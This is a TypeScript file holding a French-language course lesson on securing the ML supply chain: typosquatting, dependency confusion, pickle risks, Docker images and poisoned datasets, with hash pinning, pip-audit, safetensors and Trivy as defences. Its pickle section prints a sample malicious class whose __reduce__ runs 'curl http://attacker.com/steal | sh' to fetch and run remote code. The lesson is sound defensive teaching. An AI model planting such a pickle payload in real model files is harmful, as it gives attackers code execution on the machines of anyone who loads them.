import { Lesson } from '../../types';

export const supplyChainLesson: Lesson = {
  id: 'p3-supply-chain',
  phaseId: 'phase-03',
  title: 'Sécurité de la chaîne d\'approvisionnement des modèles ML',
  content: `
# Sécurité de la chaîne d'approvisionnement des modèles ML

## Introduction

La chaîne d'approvisionnement (supply chain) d'un projet ML est vaste et complexe. Elle comprend les bibliothèques Python, les modèles pré-entraînés, les datasets publics, les images Docker, et les outils d'infrastructure. Chaque maillon de cette chaîne est un vecteur d'attaque potentiel. Les attaques supply chain sont particulièrement dangereuses car elles exploitent la confiance que nous accordons à nos dépendances.

## Les vecteurs d'attaque

### Bibliothèques et dépendances Python

Le registre PyPI est une cible privilégiée pour les attaques :

- **Typosquatting** : publier un paquet malveillant avec un nom similaire à une bibliothèque populaire (par exemple \`scikit-laern\` au lieu de \`scikit-learn\`)
- **Dependency confusion** : exploiter la résolution de dépendances pour injecter un paquet malveillant depuis un registre public à la place d'un paquet interne
- **Paquets compromis** : un mainteneur légitime dont le compte est compromis publie une version malveillante

\`\`\`bash
# Vérifier les hashes des paquets installés
pip install --require-hashes -r requirements.txt

# Exemple de requirements.txt avec hashes
# tensorflow==2.15.0 \\
#     --hash=sha256:abc123...
# numpy==1.26.2 \\
#     --hash=sha256:def456...
\`\`\`

### Modèles pré-entraînés

Les modèles téléchargés depuis des hubs publics (Hugging Face, TensorFlow Hub) peuvent contenir :

- **Du code malveillant** dans les fichiers pickle (désérialisation arbitraire)
- **Des backdoors** dans les poids du modèle
- **Des biais intentionnels** dans le comportement du modèle

\`\`\`python
# DANGEREUX : pickle peut exécuter du code arbitraire
import pickle

# Exemple de payload malveillant dans un pickle
class MaliciousModel:
    def __reduce__(self):
        import os
        return (os.system, ("curl http://attacker.com/steal | sh",))

# SÉCURISÉ : utiliser safetensors au lieu de pickle
from safetensors.torch import load_file

# Charger un modèle en toute sécurité (pas de désérialisation arbitraire)
state_dict = load_file("model.safetensors")
\`\`\`

### Images Docker

- **Images de base compromises** : une image Docker populaire peut contenir un malware
- **Couches cachées** : du code malveillant peut être introduit dans une couche intermédiaire de l'image
- **Registres non sécurisés** : télécharger depuis un registre sans vérification d'intégrité

### Datasets publics

- **Données empoisonnées** dans des datasets hébergés sur des plateformes publiques
- **Métadonnées altérées** : des labels modifiés dans un dataset téléchargé sans vérification

## Stratégies de protection

### Verrouillage des dépendances

\`\`\`bash
# Générer un fichier lock avec pip-tools
pip-compile requirements.in --generate-hashes -o requirements.txt

# Utiliser pip-audit pour scanner les vulnérabilités
pip install pip-audit
pip-audit -r requirements.txt

# Résultat exemple :
# Found 2 known vulnerabilities in 1 package
# Name     Version  ID                  Fix Versions
# pillow   9.0.0    PYSEC-2022-43012    9.0.1
\`\`\`

### Vérification des modèles pré-entraînés

\`\`\`python
import hashlib

def verify_model_integrity(model_path, expected_hash):
    """Vérifie l'intégrité d'un fichier modèle."""
    sha256 = hashlib.sha256()
    with open(model_path, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            sha256.update(chunk)

    actual_hash = sha256.hexdigest()
    if actual_hash != expected_hash:
        raise SecurityError(
            f"Hash du modèle invalide !\\n"
            f"Attendu : {expected_hash}\\n"
            f"Obtenu  : {actual_hash}"
        )
    return True

# Toujours vérifier avant de charger
verify_model_integrity(
    "models/bert-base.safetensors",
    "a1b2c3d4e5f6..."
)
\`\`\`

### Sécurisation des images Docker

\`\`\`dockerfile
# Utiliser des images de base officielles et épinglées par digest
FROM python:3.11-slim@sha256:abc123def456...

# Scanner l'image avec Trivy
# trivy image mon-image:latest
\`\`\`

\`\`\`bash
# Scanner une image Docker pour les vulnérabilités
trivy image --severity HIGH,CRITICAL mon-ml-api:latest

# Scanner un fichier système de fichiers
trivy fs --security-checks vuln,config .
\`\`\`

### Registre privé et miroir

\`\`\`bash
# Configurer un miroir PyPI privé avec devpi
devpi-server --start --port 3141

# Configurer pip pour utiliser le miroir
pip install --index-url http://localhost:3141/root/pypi/ tensorflow

# Configurer un registre Docker privé
docker run -d -p 5000:5000 --name registry registry:2
\`\`\`

## Outils de sécurité recommandés

| Outil | Usage |
|-------|-------|
| **pip-audit** | Scanner les vulnérabilités des paquets Python |
| **Trivy** | Scanner les images Docker et le code |
| **Snyk** | Analyse de sécurité des dépendances |
| **safetensors** | Format sécurisé pour les modèles (pas de pickle) |
| **Sigstore/cosign** | Signature et vérification des artefacts |
| **SLSA** | Framework de niveaux de sécurité supply chain |

## Bonnes pratiques

- Épinglez toujours les versions exactes de vos dépendances avec leurs hashes
- Préférez le format \`safetensors\` à pickle pour le stockage de modèles
- Scannez régulièrement vos images Docker et dépendances Python
- Utilisez des registres privés avec contrôle d'accès pour les artefacts critiques
- Mettez en place un processus de revue pour l'ajout de nouvelles dépendances
`,
  keyPoints: [
    'La chaîne d\'approvisionnement ML comprend les bibliothèques, modèles pré-entraînés, datasets et images Docker, chacun étant un vecteur d\'attaque',
    'Le format pickle permet l\'exécution de code arbitraire : préférez safetensors pour charger les modèles en toute sécurité',
    'Le verrouillage des dépendances avec hashes et pip-audit protège contre le typosquatting et les paquets compromis',
    'Les outils comme Trivy et Snyk détectent automatiquement les vulnérabilités connues dans les images et dépendances',
    'La vérification d\'intégrité par hash SHA-256 garantit que les modèles téléchargés n\'ont pas été altérés',
  ],
  resources: [
    {
      title: 'SLSA - Supply-chain Levels for Software Artifacts',
      url: 'https://slsa.dev/',
      type: 'article',
    },
    {
      title: 'Safetensors - A safer serialization format',
      url: 'https://github.com/huggingface/safetensors',
      type: 'tool',
    },
    {
      title: 'Securing the ML Supply Chain (Google Security Blog)',
      url: 'https://security.googleblog.com/2024/06/securing-the-ai-supply-chain.html',
      type: 'article',
    },
  ],
  estimatedMinutes: 25,
};
